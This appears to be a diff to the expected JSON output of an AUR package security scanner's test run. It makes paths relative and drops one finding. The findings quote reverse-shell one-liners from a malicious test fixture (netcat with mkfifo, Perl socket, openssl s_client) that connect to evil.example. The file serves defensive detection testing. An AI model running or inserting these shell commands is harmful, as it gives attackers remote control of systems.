@@ -9,7 +9,7 @@
       "title": "Netcat data transfer (install script)",
       "description": "Using netcat to transfer data externally",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
         "line": 3,
         "column": 47,
         "snippet": "  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f"
@@ -28,7 +28,7 @@
       "title": "Perl reverse shell (install script)",
       "description": "A Perl socket reverse shell (Socket + connect/exec).",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
         "line": 2,
         "column": 3,
         "snippet": "  perl -e 'use Socket;$i=\"evil.example\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));exec(\"/bin/sh -i\");'"
@@ -47,7 +47,7 @@
       "title": "OpenSSL-encrypted reverse shell (install script)",
       "description": "openssl s_client used as an encrypted C2 channel.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
         "line": 4,
         "column": 3,
         "snippet": "  openssl s_client -quiet -connect evil.example:4443 | /bin/sh"
@@ -66,7 +66,7 @@
       "title": "Named-pipe (mkfifo) reverse shell (install script)",
       "description": "mkfifo paired with nc/openssl/ /dev/tcp — the classic backpipe reverse shell that evades `nc -e` detection.",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
+        "file": "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
         "line": 3,
         "column": 3,
         "snippet": "  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f"
@@ -79,32 +79,13 @@
       }
     },
     {
-      "id": "HIDDEN-002",
-      "severity": "high",
-      "category": "malicious_code",
-      "title": "Tmp directory execution (install script)",
-      "description": "Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.",
-      "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install",
-        "line": 3,
-        "column": 72,
-        "snippet": "  mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil.example 4444 > /tmp/f"
-      },
-      "recommendation": "Packages should not execute from /tmp",
-      "cwe_id": null,
-      "metadata": {
-        "in_install_script": true,
-        "matched_text": "/tmp/f"
-      }
-    },
-    {
       "id": "CHK-005",
       "severity": "high",
       "category": "cryptography",
       "title": "All non-VCS sources use SKIP checksum",
       "description": "No integrity verification is performed on 1 non-VCS source(s)",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
+        "file": "tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
         "line": null,
         "column": null,
         "snippet": null
@@ -118,9 +99,9 @@
     }
   ],
   "scanned_files": [
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install"
+    "tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
+    "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install"
   ],
-  "timestamp": "2026-06-15T01:57:17.294870393Z",
-  "scan_duration_ms": 3
+  "timestamp": "2026-06-15T10:43:31.182534251Z",
+  "scan_duration_ms": 6
 }
